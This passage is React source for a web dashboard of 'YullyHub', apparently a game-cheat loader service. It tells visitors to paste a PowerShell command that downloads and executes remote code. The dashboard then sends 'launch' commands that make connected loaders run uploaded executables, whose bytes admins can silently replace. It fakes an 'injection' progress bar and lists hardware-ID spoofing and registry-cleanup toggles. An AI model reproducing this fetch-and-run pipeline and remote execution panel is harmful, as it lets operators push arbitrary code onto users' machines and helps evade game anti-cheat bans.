'use client';

import { useEffect, useRef, useState, useCallback } from 'react';

// ---- Landing page — shown until a loader with matching ?session=<id>
//      is polling /api/loader/poll. Anonymous visitors never see the
//      dashboard because they don't have a valid session id yet. ----
function LandingPage({ session, checking }) {
    const cmd = 'irm https://yullyhub.com/loader | iex';
    const [copied, setCopied] = useState(false);
    const doCopy = async () => {
        try { await navigator.clipboard.writeText(cmd); setCopied(true); setTimeout(() => setCopied(false), 1500); } catch {}
    };
    return (
        <div className="landing">
            <div className="landing-inner">
                <div className="landing-brand">YULLYHUB</div>
                <div className="landing-label">Run:</div>
                <div className="landing-code-row">
                    <code className="landing-code">{cmd}</code>
                    <button className="landing-copy" onClick={doCopy}>{copied ? 'Copied ✓' : 'Copy'}</button>
                </div>
                <div className="landing-hint">
                    {session
                        ? checking
                            ? 'Waiting for loader to connect…'
                            : 'Loader not online. Run the command above in PowerShell to start it.'
                        : 'Open PowerShell, paste the command, hit enter. Your browser will re-open with the dashboard.'}
                </div>
            </div>
        </div>
    );
}

const DEMO_GAMES = [
    { id: 'demo-gta',  name: 'GTA V',    cls: 'g-gta',  desc: 'Demo card — upload your own product in Admin.', demo: true },
    { id: 'demo-dota', name: 'Dota 2',   cls: 'g-dota', desc: 'Demo card — upload your own product in Admin.', demo: true },
    { id: 'demo-cs',   name: 'CS2',      cls: 'g-cs',   desc: 'Demo card — upload your own product in Admin.', demo: true },
    { id: 'demo-val',  name: 'Valorant', cls: 'g-val',  desc: 'Demo card — upload your own product in Admin.', demo: true },
];

const DEMO_CLASSES = ['g-gta', 'g-dota', 'g-cs', 'g-val'];

export default function Page() {
    // ---- Session gate — the URL must carry ?session=<loaderId>, and
    //      that loader must be actively polling /api/loader/poll before
    //      the dashboard is unlocked. Otherwise show the landing page. ----
    const [session, setSession] = useState(null);
    const [loaderConnected, setLoaderConnected] = useState(false);
    const [checkingLoader, setCheckingLoader] = useState(true);

    useEffect(() => {
        if (typeof window === 'undefined') return;
        const url = new URL(window.location.href);
        const s = url.searchParams.get('session');
        setSession(s);
        if (!s) { setCheckingLoader(false); return; }

        let alive = true;
        let hasSeenOnline = false;
        const check = async () => {
            try {
                const r = await fetch(`/api/loader/status?id=${encodeURIComponent(s)}`, { cache: 'no-store' });
                if (!alive) return;
                if (r.ok) {
                    const j = await r.json();
                    const online = !!j.online;
                    if (online) hasSeenOnline = true;
                    // Once a loader has been seen, keep the dashboard
                    // unlocked even if a later status poll misses (Vercel
                    // serverless can route to a cold instance whose
                    // in-memory `seen` Map is empty — that would flap the
                    // UI otherwise).
                    setLoaderConnected(hasSeenOnline);
                    // Also sync the topbar's "N loader(s) online" pill,
                    // which used to be driven only by the WebSocket.
                    setState((prev) => ({
                        ...prev,
                        online,
                        count: online ? 1 : 0,
                        agents: online ? [{ id: s, addr: 'https poll', connectedAt: j.lastSeen || Date.now() }] : [],
                    }));
                }
            } catch {}
            if (alive) setCheckingLoader(false);
        };
        check();
        const iv = setInterval(check, 2500);
        return () => { alive = false; clearInterval(iv); };
    }, []);

    const [screen, setScreen] = useState('home');
    const [selected, setSelected] = useState(0);
    const [state, setState] = useState({ online: false, count: 0, agents: [] });
    const [events, setEvents] = useState([]);
    const [injectPct, setInjectPct] = useState(0);
    const [injectStatus, setInjectStatus] = useState('Processing...');
    const [products, setProducts] = useState([]);
    const [busy, setBusy] = useState(false);
    const [upload, setUpload] = useState({ exe: null, image: null, title: '' });
    const wsRef = useRef(null);

    const pushEvent = (msg, cls = '') => {
        const t = new Date().toLocaleTimeString();
        setEvents((e) => [{ t, msg, cls, id: Math.random().toString(36).slice(2) }, ...e].slice(0, 60));
    };

    const loadProducts = useCallback(async () => {
        try {
            const r = await fetch('/api/products');
            const j = await r.json();
            setProducts(j.products || []);
        } catch {}
    }, []);

    // ---- WebSocket to /ws-ui ----
    useEffect(() => {
        let alive = true;
        let ws;
        const connect = () => {
            if (!alive) return;
            // Auto-pick ws vs wss based on the page scheme so we don't
            // trip mixed-content on Vercel (https → wss).
            const scheme = (location.protocol === 'https:') ? 'wss' : 'ws';
            ws = new WebSocket(`${scheme}://${location.host}/ws-ui`);
            wsRef.current = ws;
            ws.onopen = () => pushEvent('dashboard connected to server', 'ok');
            ws.onmessage = (ev) => {
                try {
                    const data = JSON.parse(ev.data);
                    if (data.type === 'state') {
                        setState({ online: data.online, count: data.count, agents: data.agents });
                    } else if (data.type === 'loader_connected') {
                        pushEvent(`loader connected [id=${data.agent.id}]`, 'ok');
                    } else if (data.type === 'loader_disconnected') {
                        pushEvent(`loader disconnected [id=${data.agent.id}]`, 'bad');
                    } else if (data.type === 'command_sent') {
                        pushEvent(`> ${data.command}  delivered=${data.delivered}`, 'accent');
                    } else if (data.type === 'loader_message') {
                        pushEvent(`< ${data.agent.id}: ${JSON.stringify(data.message)}`, '');
                    }
                } catch {}
            };
            ws.onclose = () => {
                pushEvent('server disconnected — retrying...', 'warn');
                setTimeout(connect, 1200);
            };
            ws.onerror = () => ws.close();
        };
        connect();
        loadProducts();
        return () => { alive = false; ws?.close(); };
    }, [loadProducts]);

    // ---- Fire command ----
    const sendCommand = async (payload) => {
        try {
            const r = await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            });
            return await r.json();
        } catch (e) {
            pushEvent('send failed: ' + e.message, 'bad');
            return null;
        }
    };

    const islandSend = (msg) => {
        try {
            if (wsRef.current && wsRef.current.readyState === 1) {
                wsRef.current.send(JSON.stringify(msg));
            }
        } catch {}
    };

    // `overrideIdx` bypasses the (stale) `selected` state — pass the index
    // of the card you actually clicked so the closure doesn't fire on the
    // previously-selected product.
    const handleStart = async (overrideIdx) => {
        const list = getVisibleList();
        const idx = (typeof overrideIdx === 'number') ? overrideIdx : safeSelected;
        const target = list[idx];
        if (!target) return;
        if (typeof overrideIdx === 'number') setSelected(overrideIdx);
        setScreen('inject');
        setInjectPct(0);
        setInjectStatus('Processing...');

        const productName = target.name || target.title || 'product';

        if (target.demo) {
            sendCommand({ type: 'ping' });
        } else {
            const url = `${location.protocol}//${location.host}/api/products/${target.id}/exe`;
            // Mint an exchange token so the launched product can handshake
            // with /api/auth/handshake and confirm the user's subscription.
            // See Loader/examples/auth_handshake.cpp for the client side.
            let token = null;
            try {
                const r = await fetch('/api/auth/exchange', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        productId: target.id,
                        userId:    'demo-user',
                        plan:      'lifetime',
                    }),
                });
                if (r.ok) {
                    const j = await r.json();
                    token = j.token;
                    pushEvent(`auth: minted token ${token.slice(0,8)}… ttl=${j.ttl_seconds}s`, 'ok');
                } else {
                    pushEvent(`auth: exchange failed (HTTP ${r.status})`, 'warn');
                }
            } catch (e) {
                pushEvent('auth: exchange error ' + e.message, 'warn');
            }
            sendCommand({
                type:      'launch',
                productId: target.id,
                title:     target.title,
                url,
                token,
                apiHost:   `${location.protocol}//${location.host}`,
            });
        }
        // Fetch the LATEST script for this product before running the
        // injection ring so we never miss an edit the user just made.
        let latestScript = Array.isArray(target.script) ? target.script : null;
        if (!target.demo) {
            try {
                const r = await fetch(`/api/products/${target.id}`);
                if (r.ok) {
                    const fresh = await r.json();
                    if (Array.isArray(fresh.script)) latestScript = fresh.script;
                }
            } catch {}
        }

        let p = 0;
        const iv = setInterval(() => {
            p += 3 + Math.random() * 4;
            if (p >= 100) {
                p = 100;
                clearInterval(iv);
                setInjectStatus('Injection complete.');
                setInjectPct(100);
                // Send the product's script to the Island so it starts
                // playing the customer-facing instructions.
                const script = Array.isArray(latestScript) && latestScript.length
                    ? latestScript
                    : [{ kind: 'message', text: `${productName} loaded successfully!`, dismiss: 'timeout', timeout: 2.5 },
                       { kind: 'close' }];
                pushEvent(`island: playing ${script.length} step${script.length === 1 ? '' : 's'} for ${productName}`, 'ok');
                islandSend({
                    type: 'island',
                    action: 'script',
                    product: productName,
                    steps: script,
                });

                // Once the island is in charge, hide the dashboard.
                // Browsers block window.close() on tabs the user opened
                // manually — if that fails we drop the UI to a subtle
                // "dynamic island active" placeholder so nothing distracts.
                setTimeout(() => {
                    setScreen('handover');
                    try { window.close(); } catch {}
                }, 900);
            } else {
                setInjectPct(p);
            }
        }, 90);
    };

    // ---- Upload ----
    const handleUpload = async (e) => {
        e.preventDefault();
        if (!upload.exe) { pushEvent('pick an .exe first', 'bad'); return; }
        setBusy(true);
        const form = new FormData();
        form.append('exe', upload.exe);
        if (upload.image) form.append('image', upload.image);
        if (upload.title.trim()) form.append('title', upload.title.trim());
        try {
            const r = await fetch('/api/products', { method: 'POST', body: form });
            const j = await r.json();
            if (r.ok) {
                pushEvent(`uploaded product "${j.title}" (${(j.exeSize/1024).toFixed(1)} KB)`, 'ok');
                setUpload({ exe: null, image: null, title: '' });
                document.getElementById('exeInput').value = '';
                if (document.getElementById('imgInput')) document.getElementById('imgInput').value = '';
                await loadProducts();
            } else {
                pushEvent('upload failed: ' + (j.error || 'unknown'), 'bad');
            }
        } catch (e) {
            pushEvent('upload error: ' + e.message, 'bad');
        }
        setBusy(false);
    };

    // ---- Update existing product ----
    // Replace one or more of {exe, image, title}. Keeps the same product id
    // and /api/products/<id>/exe URL, so every subsequent loader launch
    // pulls the NEW bytes fresh (no caching anywhere).
    const updateProduct = async (id, { exe, image, title } = {}) => {
        setBusy(true);
        const form = new FormData();
        if (exe)   form.append('exe', exe);
        if (image) form.append('image', image);
        if (title && title.trim()) form.append('title', title.trim());
        try {
            const r = await fetch(`/api/products/${id}`, { method: 'PUT', body: form });
            const j = await r.json();
            if (r.ok) {
                const parts = [];
                if (exe)   parts.push(`exe (${(j.exeSize/1024).toFixed(1)} KB)`);
                if (image) parts.push('image');
                if (title) parts.push(`title="${j.title}"`);
                pushEvent(`updated product ${id}: ${parts.join(', ') || 'nothing'}`, 'ok');
                await loadProducts();
            } else {
                pushEvent(`update failed: ${j.error || 'unknown'}`, 'bad');
            }
        } catch (e) {
            pushEvent('update error: ' + e.message, 'bad');
        }
        setBusy(false);
    };

    const pickAndUpdateExe = (id) => {
        const el = document.createElement('input');
        el.type = 'file';
        el.accept = '.exe,application/x-msdownload,application/octet-stream';
        el.onchange = async () => {
            const f = el.files?.[0];
            if (f) await updateProduct(id, { exe: f });
        };
        el.click();
    };

    const pickAndUpdateImage = (id) => {
        const el = document.createElement('input');
        el.type = 'file';
        el.accept = 'image/*';
        el.onchange = async () => {
            const f = el.files?.[0];
            if (f) await updateProduct(id, { image: f });
        };
        el.click();
    };

    // ---- SCRIPT EDITOR ----
    // A script is an ordered list of steps the Dynamic Island plays after
    // the product finishes loading. See PUT /api/products/[id] for the shape.
    const [scriptEditor, setScriptEditor] = useState(null); // { id, title, steps }
    const openScriptEditor = (product) => {
        const existing = Array.isArray(product.script) ? product.script : [];
        const cloned = existing.length ? existing : [
            { kind: 'message', text: 'Press F2 once you are in game',
              dismiss: 'keybind', keybind: 'F2', timeout: 30 },
            { kind: 'message', text: 'Injecting Product…',
              dismiss: 'timeout', timeout: 3 },
            { kind: 'success', text: 'Product Injected Successfully', timeout: 2.5 },
            { kind: 'close', text: 'Click me to close loader', timeout: 4 },
        ];
        // Reset the "last-saved" watermark so the auto-save effect will
        // PUT the current buffer even if it happens to equal the previous
        // session's contents.
        _lastSavedRef.current = existing.length ? JSON.stringify(existing) : '';
        setScriptSaveState('idle');
        setScriptEditor({ id: product.id, title: product.title, steps: cloned });
    };
    const updateStep = (idx, patch) => setScriptEditor(s =>
        s ? { ...s, steps: s.steps.map((st, i) => i === idx ? { ...st, ...patch } : st) } : s
    );
    const addStep = (kind) => setScriptEditor(s => {
        if (!s) return s;
        let base;
        if (kind === 'close')      base = { kind: 'close',   text: 'Click me to close loader', timeout: 4 };
        else if (kind === 'success') base = { kind: 'success', text: 'Product Injected Successfully', timeout: 2.5 };
        else                       base = { kind: 'message', text: 'Type message…', dismiss: 'timeout', timeout: 2 };
        return { ...s, steps: [...s.steps, base] };
    });
    const removeStep = (idx) => setScriptEditor(s =>
        s ? { ...s, steps: s.steps.filter((_, i) => i !== idx) } : s
    );
    const moveStep = (idx, dir) => setScriptEditor(s => {
        if (!s) return s;
        const j = idx + dir;
        if (j < 0 || j >= s.steps.length) return s;
        const steps = s.steps.slice();
        [steps[idx], steps[j]] = [steps[j], steps[idx]];
        return { ...s, steps };
    });
    // Auto-save script edits back to the server (debounced). No manual
    // "SAVE" button — you can't forget it. `_savedRef` remembers the last
    // JSON we PUT so we don't spam the network with identical bodies.
    const _lastSavedRef = useRef('');
    const [scriptSaveState, setScriptSaveState] = useState('idle'); // 'idle' | 'saving' | 'saved'
    useEffect(() => {
        if (!scriptEditor) return;
        const body = JSON.stringify(scriptEditor.steps);
        if (body === _lastSavedRef.current) return;
        setScriptSaveState('saving');
        const t = setTimeout(async () => {
            try {
                const form = new FormData();
                form.append('script', body);
                const r = await fetch(`/api/products/${scriptEditor.id}`, { method: 'PUT', body: form });
                if (r.ok) {
                    _lastSavedRef.current = body;
                    setScriptSaveState('saved');
                    pushEvent(`script auto-saved for ${scriptEditor.title} (${scriptEditor.steps.length} step${scriptEditor.steps.length === 1 ? '' : 's'})`, 'ok');
                    await loadProducts();
                } else {
                    const j = await r.json().catch(() => ({}));
                    setScriptSaveState('idle');
                    pushEvent('script save failed: ' + (j.error || r.status), 'bad');
                }
            } catch (e) {
                setScriptSaveState('idle');
                pushEvent('script save error: ' + e.message, 'bad');
            }
        }, 350);
        return () => clearTimeout(t);
    }, [scriptEditor?.steps, scriptEditor?.id]);

    const renameProduct = async (id, currentTitle) => {
        const t = prompt('Rename product to:', currentTitle || '');
        if (t == null) return;
        const trimmed = t.trim();
        if (!trimmed || trimmed === currentTitle) return;
        await updateProduct(id, { title: trimmed });
    };

    const deleteProduct = async (id) => {
        if (!confirm('Delete this product?')) return;
        await fetch(`/api/products/${id}`, { method: 'DELETE' });
        pushEvent(`deleted product ${id}`, 'warn');
        await loadProducts();
    };

    // ---- Combined list for home carousel ----
    const getVisibleList = () => {
        if (products.length > 0) {
            return products.map((p, i) => ({
                ...p,
                name: p.title,
                cls: DEMO_CLASSES[i % DEMO_CLASSES.length],
                desc: `${p.exeName} · ${(p.exeSize / 1024).toFixed(1)} KB`,
                demo: false,
            }));
        }
        return DEMO_GAMES;
    };
    const list = getVisibleList();
    const safeSelected = Math.min(selected, list.length - 1);
    const g = list[safeSelected] || list[0];

    // Reset selected when list shrinks
    useEffect(() => {
        if (selected >= list.length && list.length > 0) setSelected(0);
    }, [list.length, selected]);

    // ---- 5-slot horizontal carousel ------------------------------------
    // Each card renders with a data-slot attribute (-2 -1 0 1 2 | hidden).
    // The whole INNER track translates by dragDelta during a live drag so
    // every card slides with the pointer. On release past DRAG_TRIGGER we
    // commit a switch and the track eases into the new centre.
    const dragRef = useRef({ dragging: false, startX: 0 });
    const [dragging, setDragging]           = useState(false);
    const [dragDelta, setDragDelta]         = useState(0);
    const [transitioning, setTransitioning] = useState(false);

    const CARD_STEP    = 208;
    const DRAG_TRIGGER = 80;
    const SWITCH_MS    = 650;

    // Slot for a given index — circular, values in [-2..2] or 'hidden'
    const slotFor = (idx) => {
        const n = list.length;
        if (n === 0) return 'hidden';
        let d = ((idx - safeSelected) + n) % n;
        if (d > n / 2) d -= n;
        return Math.abs(d) > 2 ? 'hidden' : String(d);
    };

    const commitSwitch = (dir) => {
        if (transitioning || list.length === 0) return;
        setTransitioning(true);
        setSelected((s) => (s + dir + list.length) % list.length);
        setDragDelta(0);
        setTimeout(() => setTransitioning(false), SWITCH_MS);
    };

    const onCarouselDown = (e) => {
        if (transitioning || list.length === 0) return;
        const x = e.clientX ?? e.touches?.[0]?.clientX;
        if (x == null) return;
        dragRef.current = { dragging: true, startX: x };
        setDragging(true);
    };
    const onCarouselMove = (e) => {
        if (!dragRef.current.dragging) return;
        const x = e.clientX ?? e.touches?.[0]?.clientX;
        if (x == null) return;
        let d = x - dragRef.current.startX;
        // Rubber-band past ±1.5 * step so the drag feels weighty
        const cap = CARD_STEP * 1.5;
        if (d >  cap) d =  cap + (d - cap) * 0.15;
        if (d < -cap) d = -cap + (d + cap) * 0.15;
        setDragDelta(d);
    };
    const onCarouselUp = () => {
        if (!dragRef.current.dragging) return;
        dragRef.current.dragging = false;
        setDragging(false);
        const d = dragDelta;
        if (Math.abs(d) < DRAG_TRIGGER || list.length === 0) {
            setDragDelta(0);
            return;
        }
        commitSwitch(d < 0 ? 1 : -1);
    };

    useEffect(() => {
        window.addEventListener('mousemove', onCarouselMove);
        window.addEventListener('mouseup',   onCarouselUp);
        window.addEventListener('touchmove', onCarouselMove, { passive: true });
        window.addEventListener('touchend',  onCarouselUp);
        return () => {
            window.removeEventListener('mousemove', onCarouselMove);
            window.removeEventListener('mouseup',   onCarouselUp);
            window.removeEventListener('touchmove', onCarouselMove);
            window.removeEventListener('touchend',  onCarouselUp);
        };
    }, [list.length, dragDelta, transitioning]);

    useEffect(() => {
        const onKey = (e) => {
            if (screen !== 'home') return;
            if (e.key === 'ArrowLeft')  commitSwitch(-1);
            if (e.key === 'ArrowRight') commitSwitch( 1);
        };
        window.addEventListener('keydown', onKey);
        return () => window.removeEventListener('keydown', onKey);
    }, [list.length, screen, transitioning]);

    // Gate — no valid session + connected loader → landing page only.
    if (!session || !loaderConnected) {
        return <LandingPage session={session} checking={checkingLoader} />;
    }

    return (
        <>
            <svg width="0" height="0" style={{ position: 'absolute' }}>
                <defs>
                    <linearGradient id="ringGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" stopColor="#e91e63" />
                        <stop offset="100%" stopColor="#ff4020" />
                    </linearGradient>
                </defs>
            </svg>

            <div className="app">
                <aside className="sidebar">
                    <div className="sidebar-brand">Y</div>
                    <div className="sidebar-thread">
                        <button
                            className={`sidebar-nav-btn ${screen === 'home' ? 'active' : ''}`}
                            onClick={() => setScreen('home')}
                            title="Home"
                        >
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M3 12l9-9 9 9M5 10v10h14V10"/></svg>
                        </button>
                        <button
                            className={`sidebar-nav-btn ${screen === 'admin' ? 'active' : ''}`}
                            onClick={() => setScreen('admin')}
                            title="Admin — upload products"
                        >
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 3v12"/><polyline points="7 8 12 3 17 8"/><path d="M4 21h16"/></svg>
                        </button>
                        <button
                            className={`sidebar-nav-btn ${screen === 'settings' ? 'active' : ''}`}
                            onClick={() => setScreen('settings')}
                            title="Settings"
                        >
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.7 1.7 0 0 0 .3 1.9l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.7 1.7 0 0 0-1.9-.3 1.7 1.7 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.7 1.7 0 0 0-1.1-1.5 1.7 1.7 0 0 0-1.9.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.7 1.7 0 0 0 .3-1.9 1.7 1.7 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1a1.7 1.7 0 0 0 1.5-1.1 1.7 1.7 0 0 0-.3-1.9l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.7 1.7 0 0 0 1.9.3H9a1.7 1.7 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.7 1.7 0 0 0 1 1.5 1.7 1.7 0 0 0 1.9-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.7 1.7 0 0 0-.3 1.9V9a1.7 1.7 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.7 1.7 0 0 0-1.5 1z"/></svg>
                        </button>
                        <button
                            className={`sidebar-nav-btn ${screen === 'login' ? 'active' : ''}`}
                            onClick={() => setScreen('login')}
                            title="Account"
                        >
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                        </button>
                    </div>
                    <div className="sidebar-footer" title="YullyHub">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 2 3 7v10l9 5 9-5V7z"/><path d="M3 7l9 5 9-5"/><path d="M12 12v10"/></svg>
                    </div>
                </aside>

                <main className="main-col">
                    <div className="topbar">
                        <div className="brand-mark">YULLYHUB</div>
                        <div className="top-actions">
                            <div className="status-pill">
                                <span className={`pulse-dot ${state.online ? 'on' : ''}`}></span>
                                {state.online ? `${state.count} loader${state.count === 1 ? '' : 's'} online` : 'no loader'}
                            </div>
                            <button className="icon-btn" title="Minimize">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><line x1="5" y1="12" x2="19" y2="12"/></svg>
                            </button>
                            <button className="icon-btn" title="Close" onClick={() => window.close?.()}>
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><line x1="6" y1="6" x2="18" y2="18"/><line x1="18" y1="6" x2="6" y2="18"/></svg>
                            </button>
                        </div>
                    </div>

                    <div className="main">
                    {screen === 'home' && (
                        <section className="screen home-inner" key="home">
                            <div className="grid-heading">
                                <div>
                                    <div className="title">Products</div>
                                    <div className="subtitle">Click Start on any card to launch</div>
                                </div>
                                <div className="subtitle">{list.length} available</div>
                            </div>

                            {list.length === 0 ? (
                                <div className="empty-state">
                                    No products yet. Upload one in Admin.
                                </div>
                            ) : (
                                <div className="card-grid">
                                    {list.map((game, idx) => {
                                        const isActive = idx === safeSelected;
                                        const bg = game.imageName && !game.demo
                                            ? { backgroundImage: `url(/api/products/${game.id}/image)` }
                                            : undefined;
                                        return (
                                            <div
                                                key={game.id}
                                                className={`grid-card ${game.cls || 'g-dota'} ${isActive ? 'active' : ''}`}
                                                style={bg}
                                                onClick={() => setSelected(idx)}
                                            >
                                                <div className="card-name">{game.name}</div>
                                                <div className="card-caption">{game.desc}</div>
                                                <button
                                                    className="start-btn"
                                                    disabled={!state.online}
                                                    onClick={(e) => {
                                                        e.stopPropagation();
                                                        // Pass idx directly — bypasses the stale-closure bug
                                                        // where handleStart was reading the previous `selected`.
                                                        handleStart(idx);
                                                    }}
                                                >
                                                    START
                                                </button>
                                            </div>
                                        );
                                    })}
                                </div>
                            )}
                        </section>
                    )}

                    {screen === 'inject' && (
                        <section className="screen inject-inner" key="inject">
                            <div className="inject-heading">Injected: <b>{g.name}</b></div>
                            <div className="inject-status">{injectStatus}</div>
                            <div className="ring-wrap">
                                <svg className="ring" viewBox="0 0 100 100">
                                    <circle className="ring-bg" cx="50" cy="50" r="46" fill="none" strokeWidth="4"/>
                                    <circle className="ring-fg" cx="50" cy="50" r="46" fill="none"
                                            strokeWidth="4"
                                            strokeDasharray="289"
                                            strokeDashoffset={289 * (1 - injectPct / 100)}/>
                                </svg>
                                <div
                                    className="ring-inner"
                                    style={g.imageName && !g.demo ? {
                                        background: `url(/api/products/${g.id}/image) center/cover`,
                                    } : undefined}
                                >
                                    {(!g.imageName || g.demo) && g.name.toUpperCase().slice(0, 6)}
                                </div>
                            </div>
                            <button className="back-btn" onClick={() => setScreen('home')}>BACK</button>
                        </section>
                    )}

                    {screen === 'handover' && (
                        <section className="screen handover-inner" key="handover">
                            <div className="handover-title">Dynamic Island active</div>
                            <div className="handover-sub">
                                {g?.name || 'Your product'} is running. Watch the Dynamic Island for the next step — you can close this window.
                            </div>
                            <button className="back-btn" onClick={() => setScreen('home')}>Back to products</button>
                        </section>
                    )}

                    {screen === 'admin' && (
                        <section className="screen" key="admin" style={{ maxWidth: 780 }}>
                            <div className="section-title">Admin</div>

                            <form className="upload-form" onSubmit={handleUpload}>
                                <div className="field-grid">
                                    <label className="drop-field">
                                        <div className="drop-label">.EXE file <span className="req">*</span></div>
                                        <input
                                            id="exeInput"
                                            type="file"
                                            accept=".exe,application/x-msdownload,application/octet-stream"
                                            onChange={(e) => setUpload(u => ({ ...u, exe: e.target.files?.[0] || null }))}
                                        />
                                        <div className="drop-hint">
                                            {upload.exe ? `${upload.exe.name} · ${(upload.exe.size/1024).toFixed(1)} KB` : 'Choose file…'}
                                        </div>
                                    </label>

                                    <label className="drop-field">
                                        <div className="drop-label">Image <span className="opt">optional</span></div>
                                        <input
                                            id="imgInput"
                                            type="file"
                                            accept="image/*"
                                            onChange={(e) => setUpload(u => ({ ...u, image: e.target.files?.[0] || null }))}
                                        />
                                        <div className="drop-hint">
                                            {upload.image ? upload.image.name : 'Choose image…'}
                                        </div>
                                    </label>
                                </div>

                                <div className="input-field" style={{ marginTop: 12 }}>
                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                                        <path d="M4 7V4h16v3M9 20h6M12 4v16"/>
                                    </svg>
                                    <input
                                        type="text"
                                        placeholder="Title (optional — defaults to exe name)"
                                        value={upload.title}
                                        onChange={(e) => setUpload(u => ({ ...u, title: e.target.value }))}
                                    />
                                </div>

                                <button
                                    type="submit"
                                    className="primary-btn wide"
                                    style={{ marginTop: 14 }}
                                    disabled={busy || !upload.exe}
                                >
                                    {busy ? 'UPLOADING…' : 'UPLOAD PRODUCT'}
                                </button>
                            </form>

                            <div className="section-title" style={{ fontSize: 15, marginTop: 30, marginBottom: 12 }}>
                                Products ({products.length})
                            </div>

                            {products.length === 0 && (
                                <div className="empty">No products yet. Upload one above.</div>
                            )}

                            <div className="product-grid">
                                {products.map((p) => (
                                    <div className="product-card" key={p.id}>
                                        <div
                                            className="product-thumb"
                                            style={p.imageName ? {
                                                background: `url(/api/products/${p.id}/image) center/cover`,
                                            } : undefined}
                                        >
                                            {!p.imageName && <span>EXE</span>}
                                        </div>
                                        <div className="product-body">
                                            <div className="product-title">{p.title}</div>
                                            <div className="product-meta">{p.exeName} · {(p.exeSize/1024).toFixed(1)} KB</div>
                                            <div className="product-actions">
                                                <button
                                                    className="mini-btn"
                                                    disabled={!state.online}
                                                    onClick={() => sendCommand({
                                                        type: 'launch',
                                                        productId: p.id,
                                                        title: p.title,
                                                        url: `http://${location.host}/api/products/${p.id}/exe`,
                                                    })}
                                                >
                                                    Launch
                                                </button>
                                                <button
                                                    className="mini-btn"
                                                    disabled={busy}
                                                    onClick={() => pickAndUpdateExe(p.id)}
                                                    title="Replace the .exe bytes. Same URL — next launch gets the new build."
                                                >
                                                    New EXE
                                                </button>
                                                <button
                                                    className="mini-btn"
                                                    disabled={busy}
                                                    onClick={() => pickAndUpdateImage(p.id)}
                                                    title="Replace the product image."
                                                >
                                                    New Image
                                                </button>
                                                <button
                                                    className="mini-btn"
                                                    disabled={busy}
                                                    onClick={() => renameProduct(p.id, p.title)}
                                                >
                                                    Rename
                                                </button>
                                                <button
                                                    className="mini-btn"
                                                    disabled={busy}
                                                    onClick={() => openScriptEditor(p)}
                                                    title="Edit the post-injection Dynamic Island script"
                                                >
                                                    Script ({Array.isArray(p.script) ? p.script.length : 0})
                                                </button>
                                                <button
                                                    className="mini-btn danger"
                                                    onClick={() => deleteProduct(p.id)}
                                                >
                                                    Delete
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </section>
                    )}

                    {screen === 'settings' && (
                        <section className="screen" key="settings" style={{ maxWidth: 640 }}>
                            <div className="section-title">Settings</div>

                            <div className="setting-row">
                                <div className="setting-left">
                                    <div className="setting-badge">01</div>
                                    <div className="setting-name">MAC spoof</div>
                                </div>
                                <input type="checkbox" className="toggle" defaultChecked />
                            </div>
                            <div className="setting-row">
                                <div className="setting-left">
                                    <div className="setting-badge">02</div>
                                    <div className="setting-name">Serial spoof</div>
                                </div>
                                <div className="setting-status"><b>WiFi</b> is disabled</div>
                                <input type="checkbox" className="toggle" />
                            </div>
                            <div className="setting-row">
                                <div className="setting-left">
                                    <div className="setting-badge">03</div>
                                    <div className="setting-name">Volume wipe</div>
                                </div>
                                <div className="setting-status"><b>USB</b> disconnected</div>
                                <input type="checkbox" className="toggle" defaultChecked />
                            </div>
                            <div className="setting-row">
                                <div className="setting-left">
                                    <div className="setting-badge">04</div>
                                    <div className="setting-name">Registry cleanup</div>
                                </div>
                                <input type="checkbox" className="toggle" />
                            </div>

                            <div className="ping-block">
                                <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 12, fontSize: 12, color: 'var(--muted)' }}>
                                    <span className={`pulse-dot ${state.online ? 'on' : ''}`}></span>
                                    <span>
                                        {state.online
                                            ? `${state.count} loader${state.count === 1 ? '' : 's'} online`
                                            : 'no loader connected'}
                                    </span>
                                </div>
                                {state.agents.length > 0 && (
                                    <div className="agent-strip">
                                        {state.agents.map(a => (
                                            <div key={a.id} className="agent-row">
                                                <span className="live">●</span>
                                                <span className="id">{a.id}</span>
                                                <span>@ {a.addr}</span>
                                                <span style={{ marginLeft: 'auto' }}>up {Math.floor((Date.now() - a.connectedAt)/1000)}s</span>
                                            </div>
                                        ))}
                                    </div>
                                )}
                                <button
                                    className="primary-btn wide"
                                    style={{ marginTop: 12 }}
                                    disabled={!state.online}
                                    onClick={() => sendCommand({ type: 'ping' })}
                                >
                                    TEST PING
                                </button>
                                <div className="event-log">
                                    {events.length === 0 && <div><span className="t">[--:--:--]</span> waiting for events…</div>}
                                    {events.map((e) => (
                                        <div key={e.id}>
                                            <span className="t">[{e.t}]</span> <span className={e.cls}>{e.msg}</span>
                                        </div>
